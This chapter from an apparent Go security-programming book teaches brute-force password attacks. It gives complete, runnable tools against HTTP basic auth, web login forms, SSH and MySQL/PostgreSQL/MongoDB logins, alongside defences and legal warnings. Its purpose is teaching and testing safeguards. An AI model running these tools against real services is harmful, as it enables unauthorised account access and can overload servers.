<html><head></head><body>
        

                            
                    <h1 class="header-title">Brute Force</h1>
                
            
            
                
<p>Brute force attacks, also called exhaustive key attacks, are when you try every possible combination for an input until you eventually get the right combination. The most common example is brute forcing passwords. You can try every combination of characters, letters, and symbols, or you could use a dictionary list as a base for passwords. You can find dictionaries and prebuilt word lists based on common passwords online or you can create your own.</p>
<p>There are different types of brute force password attacks. There are online attacks such as trying to log in to a website or database repeatedly. Online attacks are much slower due to network latency and bandwidth limitations. Services may also rate limit or lockout accounts after too many failed attempts. On the other hand, there are also offline attacks. An example of an offline attack is when you have a database dump full of hashed passwords on your local hard disk and you can brute force it with no limitation, except the physical hardware. Serious password crackers build computers with several powerful graphics cards tuned for cracking, which cost tens of thousands of dollars.</p>
<p>One thing to note about online brute force attacks is that they are very easy to detect, cause a lot of traffic, can put a heavy load on servers and even bring them down completely, and are illegal unless you have permission. Permission can be misleading when it comes to online services. For example, just because you have an account on a service such as Facebook does not mean you have permission to brute force attack your own account. Facebook still owns the servers and you do not have permission to attack their site even if it is only against your account. Even if you are running your own service such as an SSH service on an Amazon server, you still do not have the permission to do a brute force attack. You must request and get special permission for penetration testing to or from an Amazon resource. You can use your own virtual machines for testing locally.</p>
<p>The webcomic <em>xkcd</em> has a comic that perfectly relates to the topic of brute forcing passwords:</p>
<div><img height="507" width="624" src="img/17987bbd-217b-435f-b4eb-bb536d16c4de.png"/></div>
<p>Source: https://xkcd.com/936/</p>
<p>Most, if not all of these attacks, can be protected using one or more of the following techniques:</p>
<ul>
<li>Strong passwords (ideally passphrases or keys)</li>
<li>Implementing rate limiting/temporary lockouts on failed attempts</li>
<li>Using a CAPTCHA</li>
<li>Adding two-factor authentication</li>
<li>Salting passwords</li>
<li>Limiting access to the server</li>
</ul>
<p>This chapter will cover several brute force examples including the following:</p>
<ul>
<li>HTTP basic authentication</li>
<li>HTML login forms</li>
<li>SSH password authentication</li>
<li>Databases</li>
</ul>


            

            
        
    

        

                            
                    <h1 class="header-title">Brute forcing HTTP basic authentication</h1>
                
            
            
                
<p class="mce-root">HTTP basic authentication is when you provide a username and password with your HTTP request. You can pass it as part of the URL in modern browsers. Consider this example:</p>
<pre>http://username:password@www.example.com</pre>
<p>When adding basic authentication programmatically, the credentials are provided as an HTTP header named <kbd>Authorization</kbd>, which contains a value of <kbd>username:password</kbd> base64 encoded and prefixed with <kbd>Basic</kbd>, separated by a space. Consider the following example:</p>
<pre>Authorization: Basic dXNlcm5hbWU6cGFzc3dvcmQ=</pre>
<p>Web servers typically respond with a <kbd>401 Access Denied</kbd> code when the authentication fails, and they should respond with a <kbd>2xx</kbd> success code such as <kbd>200 OK</kbd>.</p>
<p>This example will take a URL and a <kbd>username</kbd> value and attempt to log in using the passwords generated.</p>
<p>To reduce the effectiveness of attacks like these, implement a rate-limiting feature or account lockout feature after a number of failed log in attempts.</p>
<p>If you need to build your own password list from scratch, try starting with the most common passwords documented in Wikipedia at <a href="https://en.wikipedia.org/wiki/List_of_the_most_common_passwords">https://en.wikipedia.org/wiki/List_of_the_most_common_passwords</a>. Here is a short example you can save as <kbd>passwords.txt</kbd>:</p>
<pre>password<br/>123456<br/>qwerty<br/>abc123<br/>iloveyou<br/>admin<br/>passw0rd</pre>
<p>Save the list in the preceding code block as a text file with one password on each line. The name is not important since you provide the password list filename as a command-line argument:</p>
<pre>package main 
 
import ( 
   "bufio" 
   "fmt" 
   "log" 
   "net/http" 
   "os" 
) 
 
func printUsage() { 
   fmt.Println(os.Args[0] + ` - Brute force HTTP Basic Auth 
 <br/>Passwords should be separated by newlines. 
URL should include protocol prefix. 
 
Usage: 
  ` + os.Args[0] + ` &lt;username&gt; &lt;pwlistfile&gt; &lt;url&gt; 
 
Example: 
  ` + os.Args[0] + ` admin passwords.txt https://www.test.com 
`) 
} 
 
func checkArgs() (string, string, string) { 
   if len(os.Args) != 4 { 
      log.Println("Incorrect number of arguments.") 
      printUsage() 
      os.Exit(1) 
   } 
 
   // Username, Password list filename, URL 
   return os.Args[1], os.Args[2], os.Args[3] 
} 
 
func testBasicAuth(url, username, password string, doneChannel chan bool) { 
   client := &amp;http.Client{} 
   request, err := http.NewRequest("GET", url, nil) 
   request.SetBasicAuth(username, password) 
 
   response, err := client.Do(request) 
   if err != nil { 
      log.Fatal(err) 
   } 
   if response.StatusCode == 200 { 
      log.Printf("Success!\nUser: %s\nPassword: %s\n", username,   <br/>         password) 
      os.Exit(0) 
    } 
    doneChannel &lt;- true 
} 
 
func main() { 
   username, pwListFilename, url := checkArgs() 
 
   // Open password list file 
   passwordFile, err := os.Open(pwListFilename) 
   if err != nil { 
      log.Fatal("Error opening file. ", err) 
   } 
   defer passwordFile.Close() 
 
   // Default split method is on newline (bufio.ScanLines) 
   scanner := bufio.NewScanner(passwordFile) 
 
   doneChannel := make(chan bool) 
   numThreads := 0 
   maxThreads := 2 
 
   // Check each password against url 
   for scanner.Scan() { 
      numThreads += 1 
 
      password := scanner.Text() 
      go testBasicAuth(url, username, password, doneChannel) 
 
      // If max threads reached, wait for one to finish before continuing 
      if numThreads &gt;= maxThreads { 
         &lt;-doneChannel 
         numThreads -= 1 
      } 
   } 
 
   // Wait for all threads before repeating and fetching a new batch 
   for numThreads &gt; 0 { 
      &lt;-doneChannel 
      numThreads -= 1 
   } 
} </pre>


            

            
        
    

        

                            
                    <h1 class="header-title">Brute forcing the HTML login form</h1>
                
            
            
                
<p>Just about every website with a user system provides a login form on a web page. We can write a program that will submit the login form repeatedly. This example assumes that there is no CAPTCHA, rate limit, or other deterring mechanisms on the web application. Remember not to perform this attack against any production site or any site you do not own or have permission. If you want to test it, I recommend that you set up a local web server and test only locally.</p>
<p>Every web form can be created with different names for the <kbd>username</kbd> and <kbd>password</kbd> fields, so the names of those fields will need to be provided on each run and must be specific to the URL being targeted.</p>
<p>View the source or inspect the target form to get the <kbd>name</kbd> attribute from the input elements as well as the target <kbd>action</kbd> attribute from the <kbd>form</kbd> element. If no action URL is provided in the <kbd>form</kbd> element, then it defaults to the current URL. One other important piece of information is the method used on the form. Login forms should be <kbd>POST</kbd>, but it is possible that they are coded poorly and use a <kbd>GET</kbd> method. Some login forms use JavaScript to submit the form and may completely bypass the standard form method. Sites that use logic like this will require more reverse engineering to determine what the final post destination really is and how the data is formatted. You can use an HTML proxy or use the network inspector in the browser to view the XHR requests.</p>
<p>Later chapters will talk about web crawling and querying within the <kbd>DOM</kbd> interface to find specific elements based on name or CSS selectors, but this chapter will not discuss trying to auto-detect the form field and identify the proper input elements. This step must be done manually here, but, once it is identified, the brute force attack can run on its own.</p>
<p>To protect against attacks like these, implement a CAPTCHA system or a rate-limiting feature.</p>
<p>Note that every web application can have their own way of authenticating. This is not a one-size-fits-all solution. It provides an example of a basic <kbd>HTTP POST</kbd> form login, but will need to be modified slightly for different applications.</p>
<pre>package main 
 
import ( 
   "bufio" 
   "bytes" 
   "fmt" 
   "log" 
   "net/http" 
   "os" 
) 
 
func printUsage() { 
   fmt.Println(os.Args[0] + ` - Brute force HTTP Login Form 
 
Passwords should be separated by newlines. 
URL should include protocol prefix. 
You must identify the form's post URL and username and password   <br/>field names and pass them as arguments. 
 
Usage: 
  ` + os.Args[0] + ` &lt;pwlistfile&gt; &lt;login_post_url&gt; ` + <br/>      `&lt;username&gt; &lt;username_field&gt; &lt;password_field&gt; 
 
Example: 
  ` + os.Args[0] + ` passwords.txt` +<br/>      ` https://test.com/login admin username password 
`) 
} 
 
func checkArgs() (string, string, string, string, string) { 
   if len(os.Args) != 6 { 
      log.Println("Incorrect number of arguments.") 
      printUsage() 
      os.Exit(1) 
   } 
 
   // Password list, Post URL, username, username field, <br/>   // password field 
   return os.Args[1], os.Args[2], os.Args[3], os.Args[4], os.Args[5] 
} 
 
func testLoginForm( 
   url, 
   userField, 
   passField, 
   username, 
   password string, 
   doneChannel chan bool, 
) <br/>{ 
   postData := userField + "=" + username + "&amp;" + passField + <br/>      "=" + password 
   request, err := http.NewRequest( 
      "POST", 
      url, 
      bytes.NewBufferString(postData), 
   ) 
   client := &amp;http.Client{} 
   response, err := client.Do(request) 
   if err != nil { 
      log.Println("Error making request. ", err) 
   } 
   defer response.Body.Close() 
 
   body := make([]byte, 5000) // ~5k buffer for page contents 
   response.Body.Read(body) 
   if bytes.Contains(body, []byte("ERROR")) { 
      log.Println("Error found on website.") 
   } 
   log.Printf("%s", body) 
 
   if bytes.Contains(body,[]byte("ERROR")) || response.StatusCode != 200 { 
      // Error on page or in response code 
   } else { 
      log.Println("Possible success with password: ", password) 
      // os.Exit(0) // Exit on success? 
   } 
 
   doneChannel &lt;- true 
} 
 
func main() { 
   pwList, postUrl, username, userField, passField := checkArgs() 
 
   // Open password list file 
   passwordFile, err := os.Open(pwList) 
   if err != nil { 
      log.Fatal("Error opening file. ", err) 
   } 
   defer passwordFile.Close() 
 
   // Default split method is on newline (bufio.ScanLines) 
   scanner := bufio.NewScanner(passwordFile) 
 
   doneChannel := make(chan bool) 
   numThreads := 0 
   maxThreads := 32 
 
   // Check each password against url 
   for scanner.Scan() { 
      numThreads += 1 
 
      password := scanner.Text() 
      go testLoginForm( 
         postUrl, 
         userField, 
         passField, 
         username, 
         password, 
         doneChannel, 
      ) 
 
      // If max threads reached, wait for one to finish before  <br/>      //continuing 
      if numThreads &gt;= maxThreads { 
         &lt;-doneChannel 
         numThreads -= 1 
      } 
   } 
 
   // Wait for all threads before repeating and fetching a new batch 
   for numThreads &gt; 0 { 
      &lt;-doneChannel 
      numThreads -= 1 
   } <br/>} </pre>


            

            
        
    

        

                            
                    <h1 class="header-title">Brute forcing SSH</h1>
                
            
            
                
<p>Secure Shell or SSH supports a few authentication mechanisms. If a server only supports public key authentication, a brute force attempt is near futile. This example will only look at password authentication with SSH.</p>
<p>To protect against attacks like these, implement rate-limiting or a tool such as fail2ban that locks out accounts for a short duration when a number of failed login attempts are detected. Also disable the root remote login. Some people like to put SSH on a non-standard port, but end up putting it on high number non-restricted ports such as <kbd>2222</kbd>, which is not a good idea. If you use a high number non privileged port such as <kbd>2222</kbd>, another low privilege user could hijack the port and start running their own service in its place if it ever went down. Put your SSH daemon on a port lower than <kbd>1024</kbd> if you want to change it from the default.</p>
<p>This attack is obviously noisy in the logs, easy to detect, and blocked by things such as fail2ban. If you are doing a penetration test though, checking whether rate limiting or account locking is present can serve as a quick way. If no rate limiting or temporary account lockout is configured, brute force and DDoS are potential risks.</p>
<p>Running this program requires an SSH package from <a href="http://www.golang.org">golang.org</a>. You can get it using this command:</p>
<pre><strong>go get golang.org/x/crypto/ssh</strong></pre>
<p>After installing the <kbd>ssh</kbd> package required, you can run the following example:</p>
<pre>package main 
 
import ( 
   "bufio" 
   "fmt" 
   "log" 
   "os" 
 
   "golang.org/x/crypto/ssh" 
) 
 
func printUsage() { 
   fmt.Println(os.Args[0] + ` - Brute force SSH Password 
 
Passwords should be separated by newlines. 
URL should include hostname or ip with port number separated by colon 
 
Usage: 
  ` + os.Args[0] + ` &lt;username&gt; &lt;pwlistfile&gt; &lt;url:port&gt; 
 
Example: 
  ` + os.Args[0] + ` root passwords.txt example.com:22 
`) 
} 
 
func checkArgs() (string, string, string) { 
   if len(os.Args) != 4 { 
      log.Println("Incorrect number of arguments.") 
      printUsage() 
      os.Exit(1) 
   } 
 
   // Username, Password list filename, URL 
   return os.Args[1], os.Args[2], os.Args[3] 
} 
 
func testSSHAuth(url, username, password string, doneChannel chan bool) { 
   sshConfig := &amp;ssh.ClientConfig{ 
      User: username, 
      Auth: []ssh.AuthMethod{ 
         ssh.Password(password), 
      }, 
      // Do not check server key 
      HostKeyCallback: ssh.InsecureIgnoreHostKey(), 
    
      // Or, set the expected ssh.PublicKey from remote host 
      //HostKeyCallback: ssh.FixedHostKey(pubkey), 
   } 
 
   _, err := ssh.Dial("tcp", url, sshConfig) 
   if err != nil { 
      // Print out the error so we can see if it is just a failed   <br/>      // auth or if it is a connection/name resolution problem. 
      log.Println(err) 
   } else { // Success 
      log.Printf("Success!\nUser: %s\nPassword: %s\n", username,   <br/>      password) 
      os.Exit(0) 
   } 
 
   doneChannel &lt;- true // Signal another thread spot has opened up 
} 
 
func main() { 
 
   username, pwListFilename, url := checkArgs() 
 
   // Open password list file 
   passwordFile, err := os.Open(pwListFilename) 
   if err != nil { 
      log.Fatal("Error opening file. ", err) 
   } 
   defer passwordFile.Close() 
 
   // Default split method is on newline (bufio.ScanLines) 
   scanner := bufio.NewScanner(passwordFile) 
 
   doneChannel := make(chan bool) 
   numThreads := 0 
   maxThreads := 2 
 
   // Check each password against url 
   for scanner.Scan() { 
      numThreads += 1 
 
      password := scanner.Text() 
      go testSSHAuth(url, username, password, doneChannel) 
 
      // If max threads reached, wait for one to finish before continuing 
      if numThreads &gt;= maxThreads { 
         &lt;-doneChannel 
         numThreads -= 1 
      } 
   } 
 
   // Wait for all threads before repeating and fetching a new batch 
   for numThreads &gt; 0 { 
      &lt;-doneChannel 
      numThreads -= 1 
   } 
} </pre>


            

            
        
    

        

                            
                    <h1 class="header-title">Brute forcing database login</h1>
                
            
            
                
<p>Database logins can be automated and brute forced just like the other methods. In the previous brute force examples, the majority of the code is the same. The major difference between the applications is the function that actually tests the authentication. Instead of repeating all that code again, these snippets will simply demonstrate how to log in to the various databases. Modify the previous brute force scripts to test for one of these instead of the SSH or HTTP method.</p>
<p>To protect against this, limit access to a database to only the machines that need it and disable root remote login.</p>
<p>Go does not provide any database drivers in the standard library, only the interfaces. Therefore, all of these database examples require a third-party package from GitHub, as well as a running instance of the database to connect to. This book does not cover how to install and configure these database services. Each of these packages can be installed using the <kbd>go get</kbd> command:</p>
<ul>
<li>MySQL: <a href="https://github.com/go-sql-driver/mysql">https://github.com/go-sql-driver/mysql</a></li>
<li>MongoDB: <a href="https://github.com/go-mgo/mgo">https://github.com/go-mgo/mgo</a></li>
<li>PostgreSQL: <a href="https://github.com/lib/pq">https://github.com/lib/pq</a></li>
</ul>
<p>This example combines all three database libraries and provides one tool that can brute force MySQL, MongoDB, or PostgreSQL. The database type is specified as one of the command-line arguments, along with the username, host, password file, and database name. MongoDB and MySQL do not require a database name such as PostgreSQL, so it is optional when not using the  <kbd>postgres</kbd> option. A special variable called <kbd>loginFunc</kbd> is created to store the login function associated with the specified database type. This is the first time we've used a variable to hold a function. The login function is then used to perform the brute force attack:</p>
<pre>package main 
 
import ( 
   "database/sql" 
   "log" 
   "time" 
 
   // Underscore means only import for 
   // the initialization effects. 
   // Without it, Go will throw an 
   // unused import error since the mysql+postgres 
   // import only registers a database driver 
   // and we use the generic sql.Open() 
   "bufio" 
   "fmt" 
   _ "github.com/go-sql-driver/mysql" 
   _ "github.com/lib/pq" 
   "gopkg.in/mgo.v2" 
   "os" 
) 
 
// Define these at the package level since they don't change, 
// so we don't have to pass them around between functions 
var ( 
   username string 
   // Note that some databases like MySQL and Mongo 
   // let you connect without specifying a database name 
   // and the value will be omitted when possible 
   dbName        string 
   host          string 
   dbType        string 
   passwordFile  string 
   loginFunc     func(string) 
   doneChannel   chan bool 
   activeThreads = 0 
   maxThreads    = 10 
) 
 
func loginPostgres(password string) { 
   // Create the database connection string 
   // postgres://username:password@host/database 
   connStr := "postgres://" 
   connStr += username + ":" + password 
   connStr += "@" + host + "/" + dbName 
 
   // Open does not create database connection, it waits until 
   // a query is performed 
   db, err := sql.Open("postgres", connStr) 
   if err != nil { 
      log.Println("Error with connection string. ", err) 
   } 
 
   // Ping will cause database to connect and test credentials 
   err = db.Ping() 
   if err == nil { // No error = success 
      exitWithSuccess(password) 
   } else { 
      // The error is likely just an access denied, 
      // but we print out the error just in case it 
      // is a connection issue that we need to fix 
      log.Println("Error authenticating with Postgres. ", err) 
   } 
   doneChannel &lt;- true 
} 
 
func loginMysql(password string) { 
   // Create database connection string 
   // user:password@tcp(host)/database?charset=utf8 
   // The database name is not required for a MySQL 
   // connection so we leave it off here. 
   // A user may have access to multiple databases or 
   // maybe we do not know any database names 
   connStr := username + ":" + password 
   connStr += "@tcp(" + host + ")/" // + dbName 
   connStr += "?charset=utf8" 
 
   // Open does not create database connection, it waits until 
   // a query is performed 
   db, err := sql.Open("mysql", connStr) 
   if err != nil { 
      log.Println("Error with connection string. ", err) 
   } 
 
   // Ping will cause database to connect and test credentials 
   err = db.Ping() 
   if err == nil { // No error = success 
      exitWithSuccess(password) 
   } else { 
      // The error is likely just an access denied, 
      // but we print out the error just in case it 
      // is a connection issue that we need to fix 
      log.Println("Error authenticating with MySQL. ", err) 
   } 
   doneChannel &lt;- true 
} 
 
func loginMongo(password string) { 
   // Define Mongo connection info 
   // mgo does not use the Go sql driver like the others 
   mongoDBDialInfo := &amp;mgo.DialInfo{ 
      Addrs:   []string{host}, 
      Timeout: 10 * time.Second, 
      // Mongo does not require a database name 
      // so it is omitted to improve auth chances 
      //Database: dbName, 
      Username: username, 
      Password: password, 
   } 
   _, err := mgo.DialWithInfo(mongoDBDialInfo) 
   if err == nil { // No error = success 
      exitWithSuccess(password) 
   } else { 
      log.Println("Error connecting to Mongo. ", err) 
   } 
   doneChannel &lt;- true 
} 
 
func exitWithSuccess(password string) { 
   log.Println("Success!") 
   log.Printf("\nUser: %s\nPass: %s\n", username, password) 
   os.Exit(0) 
} 
 
func bruteForce() { 
   // Load password file 
   passwords, err := os.Open(passwordFile) 
   if err != nil { 
      log.Fatal("Error opening password file. ", err) 
   } 
 
   // Go through each password, line-by-line 
   scanner := bufio.NewScanner(passwords) 
   for scanner.Scan() { 
      password := scanner.Text() 
 
      // Limit max goroutines 
      if activeThreads &gt;= maxThreads { 
         &lt;-doneChannel // Wait 
         activeThreads -= 1 
      } 
 
      // Test the login using the specified login function 
      go loginFunc(password) 
      activeThreads++ 
   } 
 
   // Wait for all threads before returning 
   for activeThreads &gt; 0 { 
      &lt;-doneChannel 
      activeThreads -= 1 
   } <br/>} 
 
func checkArgs() (string, string, string, string, string) { 
   // Since the database name is not required for Mongo or Mysql 
   // Just set the dbName arg to anything. 
   if len(os.Args) == 5 &amp;&amp; 
      (os.Args[1] == "mysql" || os.Args[1] == "mongo") { 
      return os.Args[1], os.Args[2], os.Args[3], os.Args[4],   <br/>      "IGNORED" 
   } 
   // Otherwise, expect all arguments. 
   if len(os.Args) != 6 { 
      printUsage() 
      os.Exit(1) 
   } 
   return os.Args[1], os.Args[2], os.Args[3], os.Args[4], os.Args[5] 
} 
 
func printUsage() { 
   fmt.Println(os.Args[0] + ` - Brute force database login  
<br/>Attempts to brute force a database login for a specific user with  
a password list. Database name is ignored for MySQL and Mongo, 
any value can be provided, or it can be omitted. Password file 
should contain passwords separated by a newline. 
 
Database types supported: mongo, mysql, postgres 
 
Usage: 
  ` + os.Args[0] + ` (mysql|postgres|mongo) &lt;pwFile&gt;` +<br/>     ` &lt;user&gt; &lt;host&gt;[:port] &lt;dbName&gt; 
 
Examples: 
  ` + os.Args[0] + ` postgres passwords.txt nanodano` +<br/>      ` localhost:5432  myDb   
  ` + os.Args[0] + ` mongo passwords.txt nanodano localhost 
  ` + os.Args[0] + ` mysql passwords.txt nanodano localhost`) 
} 
 
func main() { 
   dbType, passwordFile, username, host, dbName = checkArgs() 
 
   switch dbType { 
   case "mongo": 
       loginFunc = loginMongo 
   case "postgres": 
       loginFunc = loginPostgres 
   case "mysql": 
       loginFunc = loginMysql 
   default: 
       fmt.Println("Unknown database type: " + dbType) 
       fmt.Println("Expected: mongo, postgres, or mysql") 
       os.Exit(1) 
   } 
 
   doneChannel = make(chan bool) 
   bruteForce() 
} </pre>


            

            
        
    

        

                            
                    <h1 class="header-title">Summary</h1>
                
            
            
                
<p>Having read this chapter, you will now understand how a basic brute force attack works against different applications. You should be able to adapt the examples given here to attack different protocols based on your needs.</p>
<p>Remember, these examples can be dangerous and potentially cause a denial of service, and it is not recommended that you run them against production services unless it is for the purpose of testing your brute force safeguards. Only perform these tests against services that you control, have permission to test, and understand the repercussions. You should never use these examples or these types of attacks against services you don't own, or you could break laws and land yourself in serious legal trouble.</p>
<p>There are fine legal lines that can be hard to distinguish for tests. For example, if you are renting a hardware appliance, you technically do not own it, and need permission to test it even if it is located in your data center. Similarly, if you are renting hosting services from a provider such as Amazon, you must get their permission before performing penetration tests or you might suffer consequences for violating terms of service.</p>
<p>In the next chapter, we will look at web applications with Go and how to harden them and increase security using best practices such as HTTPS, using secure cookies and secure HTTP headers, escaping HTML output, and adding logging. It also explores how to consume a web application as a client by making requests, using a client SSL certificate, and using proxies.</p>
<p class="mce-root"/>


            

            
        
    </body></html>